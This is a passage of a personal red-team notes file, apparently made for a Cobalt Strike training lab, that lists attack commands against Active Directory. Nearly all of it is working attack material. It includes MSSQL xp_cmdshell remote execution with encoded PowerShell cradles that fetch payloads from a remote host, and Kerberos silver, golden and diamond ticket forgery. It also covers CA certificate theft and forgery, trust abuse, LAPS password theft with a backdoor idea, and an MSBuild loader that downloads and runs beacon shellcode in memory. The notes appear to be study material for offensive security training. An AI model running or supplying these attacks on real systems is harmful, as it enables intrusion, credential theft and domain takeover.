  <node name="MSSQL Servers" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292295" ts_lastsave="1697292633">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
# Use PowerUpSQL for enumerating MS SQL Server instances
beacon&gt; powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon&gt; powerpick Get-SQLInstanceDomain

# Check access to DB instance with current user session
beacon&gt; powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
beacon&gt; powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Query execution
beacon&gt; powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

# Command Execution
beacon&gt; powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

# Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)
ubuntu@DESKTOP-3BSK7NO ~&gt; proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25 -debug

SQL&gt; EXEC xp_cmdshell 'whoami';
SQL&gt; SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL&gt; sp_configure 'Show Advanced Options', 1; RECONFIGURE;
SQL&gt; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

SQL&gt; EXEC xp_cmdshell 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA==';

# Lateral Movement (using DB Links)
beacon&gt; powerpick Get-SQLServerLink -Instance "sql-2.dev.cyberbotic.io,1433"
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" -Query "exec master..xp_cmdshell 'whoami'"

SQL&gt; SELECT * FROM master..sysservers;
SQL&gt; SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
SQL&gt; SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

SQL&gt; EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
SQL&gt; EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

SQL&gt; SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=''')

# MSSQL PrivEsc - Service Account (SeImpersonate) to System 

beacon&gt; getuid
beacon&gt; shell whoami /priv
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

beacon&gt; execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="

beacon&gt; connect localhost 4444</rich_text>
  </node>
  <node name="Domain Dominance" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292633" ts_lastsave="1697293180">
    <rich_text family="monospace" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">psexec |  CIFS 

winrm  |  HOST &amp; HTTP 

dcsync (DCs only) | LDAP</rich_text>
    <node name="silver/golden/diamond tickets" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292691" ts_lastsave="1697292996">
      <rich_text weight="heavy">
</rich_text>
      <rich_text scale="h3" weight="heavy">
</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Silver Ticket (offline)</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">1. Fetch the kerberos ekeys using mimikatz</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !sekurlsa:ekeys

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)</rich_text>
      <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">3. Inject the ticket and Verify the access </rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon&gt; steal_token 5668
beacon&gt; ls \\wkstn-1.dev.cyberbotic.io\c$


</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Golden Ticket (offline)</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">1. Fetch the NTLM/AES hash of krbtgt account</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">2. Generate Golden ticket offline using Rubeus</rich_text>
      <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">3. Inject golden ticket and gain acess</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$


</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Diamond Ticket (online)</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">1. Fetch the SID of Ticket User</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick ConvertTo-SID dev/nlamb

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">3. Verify the specs of Diamond ticket vs Golden ticket</rich_text>
      <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=


</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Forged certificates (DC or CA Server)</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">1. Dump the Private Key and Certificate of CA (to be executed on DC/CA)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">2. Save the certificate in .pem file and convert into pfx format using openssl</rich_text>
      <rich_text scale="h3" weight="heavy">
ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">3. Next, use the stolen CA cert to generate fake cert for nlamb user</rich_text>
      <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">4. Encode the certificate</rich_text>
      <rich_text scale="h3" weight="heavy">
ubuntu@DESKTOP-3BSK7NO ~&gt; cat cert.pfx | base64 -w 0

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">5. Use the certificate to get TGT for nlamb user</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">6. Inject the ticket and access the service</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
</rich_text>
    </node>
    <node name="Forests &amp; Domain Trusts" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697292996" ts_lastsave="1697293149">
      <rich_text weight="heavy">
</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainTrust



</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate basic info required for creating forged ticket</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
beacon&gt; powerpick Get-DomainController -Domain cyberbotic.io | select Name
beacon&gt; powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Use Golden Ticket technique</rich_text>
      <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Or, Use Diamond Ticket technique</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Inject the ticket</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc-1.cyberbotic.io\c$
beacon&gt; jump psexec64 dc-1.cyberbotic.io PeerSambhar
beacon&gt; dcsync cyberbotic.io cyber\krbtgt



## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) 

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># We can enumerate the foreign domain with inbound trust</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainTrust
beacon&gt; powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Check if members in current domain are part of any group in foreign domain</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
beacon&gt; powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
beacon&gt; powerpick Get-DomainController -Domain dev-studio.com | select Name

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Fetch the AES256 hash of nlamb user identfied in previous steps</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; dcsync dev.cyberbotic.io dev\nlamb

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Inject the ticket</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc.dev-studio.com\c$



</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)</rich_text>
      <rich_text scale="h3" weight="heavy">

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainTrust -Domain cyberbotic.io

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate the TDO to fetch the shared trust key </rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># To be execute on the DC having outbound trust</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; run hostname 
beacon&gt; mimikatz lsadump::trust /patch

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># OR, Use DCSync to get the ntlm hash of TDO object remotely</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
beacon&gt; mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)</rich_text>
      <rich_text scale="h3" weight="heavy">

beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Inject the ticket</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; powerpick Get-Domain -Domain msp.org
</rich_text>
    </node>
  </node>
  <node name="LAPS" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293180" ts_lastsave="1697293344">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
# Check for presence of LAPS 

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># LAPS client installed on local machine</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; ls C:\Program Files\LAPS\CSE

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set</rich_text>
    <rich_text scale="h3" weight="heavy">
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># LAPS configuration deplayed through GPO</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Download LAPS configuration</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

beacon&gt; download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Parse the LAPS GPO Policy file downloaded in previous step </rich_text>
    <rich_text scale="h3" weight="heavy">
PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Identify the principals who have read right to LAPS password</rich_text>
    <rich_text scale="h3" weight="heavy">

beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

beacon&gt; powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Use Laps Toolkit to identify Groups &amp; Users who can read LAPS password</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon&gt; powerpick Find-LAPSDelegatedGroups
beacon&gt; powerpick Find-AdmPwdExtendedRights

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># View the LAPS password for given machine (From User Session having required rights)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon&gt; powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Use the laps password to gain access</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; make_token .\LapsAdmin 1N3FyjJR5L18za
beacon&gt; ls \\wkstn-1\c$

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Set Far Future date as expiry (Only machine can set its Password)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">
# LAPS Backdoor</rich_text>
    <rich_text scale="h3" weight="heavy">
- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user
</rich_text>
  </node>
  <node name="AppLocker" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293330" ts_lastsave="1697293520">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate the Applocker policy via GPO</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

beacon&gt; download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

PS C:\Users\Attacker&gt; Parse-PolFile .\Desktop\Registry.pol

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate the Applocker policy via Local Windows registry on machine </rich_text>
    <rich_text scale="h3" weight="heavy">
PS C:\Users\Administrator&gt; Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

PS C:\Users\Administrator&gt; Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Using powershell on local system</rich_text>
    <rich_text scale="h3" weight="heavy">
PS C:\Users\Administrator&gt; $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Find the writable path within C:\winodws to bypass Applocker</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powershell Get-Acl C:\Windows\Tasks | fl</rich_text>
    <rich_text>


</rich_text>
    <node name="code" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293483" ts_lastsave="1697293488">
      <rich_text scale="h3" weight="heavy"># LOLBAS
# Use MSBuild to execute C# code from a .csproj or .xml file
# Host http_x64.xprocess.bin via Site Management &gt; Host File
# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

&lt;Project ToolsVersion="4.0" xmlns="</rich_text>
      <rich_text link="webs http://schemas.microsoft.com/developer/msbuild/2003" scale="h3" weight="heavy">http://schemas.microsoft.com/developer/msbuild/2003</rich_text>
      <rich_text scale="h3" weight="heavy">"&gt;
  &lt;Target Name="MSBuild"&gt;
   &lt;MSBuildTest/&gt;
  &lt;/Target&gt;
   &lt;UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt;
     &lt;Task&gt;
      &lt;Code Type="Class" Language="cs"&gt;
        &lt;![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "</rich_text>
      <rich_text link="webs http://nickelviper.com" scale="h3" weight="heavy">http://nickelviper.com</rich_text>
      <rich_text scale="h3" weight="heavy">";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
  &lt;/UsingTask&gt;
&lt;/Project&gt;
</rich_text>
    </node>
  </node>
  <node name="powershell execution policy" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293520" ts_lastsave="1697293582">
    <rich_text weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powershell $ExecutionContext.SessionState.LanguageMode
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">ConstrainedLanguage</rich_text>
    <rich_text scale="h3" weight="heavy">

beacon&gt; powerpick $ExecutionContext.SessionState.LanguageMode
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">FullLanguage</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)</rich_text>
    <rich_text scale="h3" weight="heavy">
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
</rich_text>
  </node>
  <node name="DATA exfiltration" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697293582" ts_lastsave="1697293773">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Enumerate Share</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; powerpick Invoke-ShareFinder
beacon&gt; powerpick Invoke-FileFinder
beacon&gt; powerpick Get-FileNetServer
